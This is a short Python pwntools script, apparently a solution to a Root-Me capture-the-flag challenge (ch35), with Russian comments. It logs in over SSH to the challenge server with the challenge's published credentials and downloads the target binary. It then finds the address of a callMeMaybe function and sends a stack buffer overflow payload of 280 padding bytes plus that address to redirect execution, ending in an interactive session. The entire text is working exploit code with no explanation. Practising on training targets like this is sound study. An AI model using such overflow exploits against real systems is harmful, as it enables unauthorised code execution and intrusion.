from pwn import *

#p = process('./binary')
s = ssh(user='app-systeme-ch35', host='challenge03.root-me.org', port=2223, password='app-systeme-ch35')

# Скачиваем серверный бинарь себе
s.download_file('/challenge/app-systeme/ch35/ch35', './ch35')

# ищем адрес callMeMaybe
elf = ELF('./ch35')
#ret = next(elf.search(asm('ret')))
callMeMaybe = elf.symbols['callMeMaybe']

print(hex(callMeMaybe)) #DEBUG

p = s.run('/challenge/app-systeme/ch35/ch35')

#callMeMaybe = 0x401156 #LOCAL adrr

payload = b'A' * 280
#payload += p64(ret)
payload += p64(callMeMaybe)

p.sendline(payload)
p.interactive()